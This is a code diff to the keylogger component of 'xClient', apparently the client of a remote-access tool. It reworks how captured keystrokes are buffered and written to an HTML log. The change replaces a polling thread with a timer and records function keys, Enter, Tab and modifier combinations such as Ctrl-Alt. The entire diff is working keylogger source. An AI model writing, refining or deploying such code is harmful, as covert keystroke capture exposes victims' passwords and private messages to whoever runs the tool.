@@ -49,11 +49,10 @@ namespace xClient.Core.Keylogger
 
         public bool Enabled
         {
-            get { return _timerLogKeys.Enabled && _timerFlush.Enabled; }
+            get { return _timerLogKeys.Enabled && _timerFlush.Enabled && _timerEmptyKeyBuffer.Enabled; }
             set
             {
-                _timerLogKeys.Enabled = _timerFlush.Enabled = value;
-                _timerLogKeys.Start();
+                _timerLogKeys.Enabled = _timerFlush.Enabled = _timerEmptyKeyBuffer.Enabled = value;
             }
         }
 
@@ -73,7 +72,7 @@ namespace xClient.Core.Keylogger
             }
         }
 
-        private static bool AltKey // not working
+        private static bool AltKey
         {
             get
             {
@@ -99,6 +98,7 @@ namespace xClient.Core.Keylogger
         private readonly List<short> _enumValues;
         private volatile List<KeyData> _keyBuffer;
         private readonly System.Timers.Timer _timerLogKeys;
+        private readonly System.Timers.Timer _timerEmptyKeyBuffer;
         private readonly System.Timers.Timer _timerFlush;
 
         /// <summary>
@@ -152,8 +152,9 @@ namespace xClient.Core.Keylogger
 
             this._timerLogKeys = new System.Timers.Timer {Enabled = false, Interval = 10};
             this._timerLogKeys.Elapsed += this.timerLogKeys_Elapsed;
-            
-            EmptyKeyBuffer();
+
+            this._timerEmptyKeyBuffer = new System.Timers.Timer { Enabled = false, Interval = 500 };
+            this._timerEmptyKeyBuffer.Elapsed += this.timerEmptyKeyBuffer_Elapsed;
 
             this._timerFlush = new System.Timers.Timer {Enabled = false, Interval = flushInterval};
             this._timerFlush.Elapsed += this.timerFlush_Elapsed;
@@ -166,83 +167,76 @@ namespace xClient.Core.Keylogger
             return string.Format("<font color=\"0000FF\">[{0}]</font>", name);
         }
 
-        private void EmptyKeyBuffer()
+        private void timerEmptyKeyBuffer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
         {
-            new Thread(() =>
+            int j = 0;
+            KeyData[] keybuffer = new KeyData[_keyBuffer.Count];
+            _keyBuffer.CopyTo(keybuffer);
+            foreach (var k in keybuffer)
             {
-                while (this.Enabled)
+                switch (k.Value)
                 {
-                    Thread.Sleep(500);
-                    int j = 0;
-                    KeyData[] keybuffer = new KeyData[_keyBuffer.Count];
-                    _keyBuffer.CopyTo(keybuffer);
-                    foreach (var k in keybuffer)
-                    {
-                        switch (k.Value)
+                    case 8:
+                        _logFileBuffer.Append(HighlightSpecialKey("Back"));
+                        break;
+                    case 9:
+                        _logFileBuffer.Append(HighlightSpecialKey("Tab"));
+                        break;
+                    case 13:
+                        _logFileBuffer.Append(HighlightSpecialKey("Enter"));
+                        break;
+                    case 32:
+                        _logFileBuffer.Append(" ");
+                        break;
+                    case 46:
+                        _logFileBuffer.Append(HighlightSpecialKey("Del"));
+                        break;
+                    case 91:
+                    case 92:
+                        _logFileBuffer.Append(HighlightSpecialKey("Win"));
+                        break;
+                    case 112:
+                    case 113:
+                    case 114:
+                    case 115:
+                    case 116:
+                    case 117:
+                    case 118:
+                    case 119:
+                    case 120:
+                    case 121:
+                    case 122:
+                        _logFileBuffer.Append(HighlightSpecialKey("F" + (k.Value - 111)));
+                        break;
+                    default:
+                        if (_enumValues.Contains(k.Value))
                         {
-                            case 8:
-                                _logFileBuffer.Append(HighlightSpecialKey("Back"));
-                                break;
-                            case 9:
-                                _logFileBuffer.Append(HighlightSpecialKey("Tab"));
-                                break;
-                            case 13:
-                                _logFileBuffer.Append(HighlightSpecialKey("Enter"));
-                                break;
-                            case 32:
-                                _logFileBuffer.Append(" ");
-                                break;
-                            case 46:
-                                _logFileBuffer.Append(HighlightSpecialKey("Del"));
-                                break;
-                            case 91:
-                            case 92:
-                                _logFileBuffer.Append(HighlightSpecialKey("Win"));
-                                break;
-                            case 112:
-                            case 113:
-                            case 114:
-                            case 115:
-                            case 116:
-                            case 117:
-                            case 118:
-                            case 119:
-                            case 120:
-                            case 121:
-                            case 122:
-                                _logFileBuffer.Append(HighlightSpecialKey("F" + (k.Value - 111)));
-                                break;
-                            default:
-                                if (_enumValues.Contains(k.Value))
-                                {
-                                    if (k.AltKey && k.ControlKey && k.ShiftKey)
-                                    {
-                                        _logFileBuffer.Append(HighlightSpecialKey("SHIFT-CTRL-ALT-" + FromKeys(k.Value, k.ShiftKey, k.CapsLock)));
-                                    }
-                                    else if (k.AltKey && k.ControlKey && !k.ShiftKey)
-                                    {
-                                        _logFileBuffer.Append(HighlightSpecialKey("CTRL-ALT-" + FromKeys(k.Value, k.ShiftKey, k.CapsLock)));
-                                    }
-                                    else if (k.AltKey && !k.ControlKey)
-                                    {
-                                        _logFileBuffer.Append(HighlightSpecialKey("ALT-" + FromKeys(k.Value, k.ShiftKey, k.CapsLock)));
-                                    }
-                                    else if (k.ControlKey && !k.AltKey)
-                                    {
-                                        _logFileBuffer.Append(HighlightSpecialKey("CTRL-" + FromKeys(k.Value, k.ShiftKey, k.CapsLock)));
-                                    }
-                                    else
-                                    {
-                                        _logFileBuffer.Append(FromKeys(k.Value, k.ShiftKey, k.CapsLock));
-                                    }
-                                }
-                                break;
+                            if (k.AltKey && k.ControlKey && k.ShiftKey)
+                            {
+                                _logFileBuffer.Append(HighlightSpecialKey("SHIFT-CTRL-ALT-" + FromKeys(k.Value, k.ShiftKey, k.CapsLock)));
+                            }
+                            else if (k.AltKey && k.ControlKey && !k.ShiftKey)
+                            {
+                                _logFileBuffer.Append(HighlightSpecialKey("CTRL-ALT-" + FromKeys(k.Value, k.ShiftKey, k.CapsLock)));
+                            }
+                            else if (k.AltKey && !k.ControlKey)
+                            {
+                                _logFileBuffer.Append(HighlightSpecialKey("ALT-" + FromKeys(k.Value, k.ShiftKey, k.CapsLock)));
+                            }
+                            else if (k.ControlKey && !k.AltKey)
+                            {
+                                _logFileBuffer.Append(HighlightSpecialKey("CTRL-" + FromKeys(k.Value, k.ShiftKey, k.CapsLock)));
+                            }
+                            else
+                            {
+                                _logFileBuffer.Append(FromKeys(k.Value, k.ShiftKey, k.CapsLock));
+                            }
                         }
-                        j++;
-                    }
-                    _keyBuffer.RemoveRange(0, j);
+                        break;
                 }
-            }).Start();
+                j++;
+            }
+            _keyBuffer.RemoveRange(0, j);
         }
 
         private void timerLogKeys_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
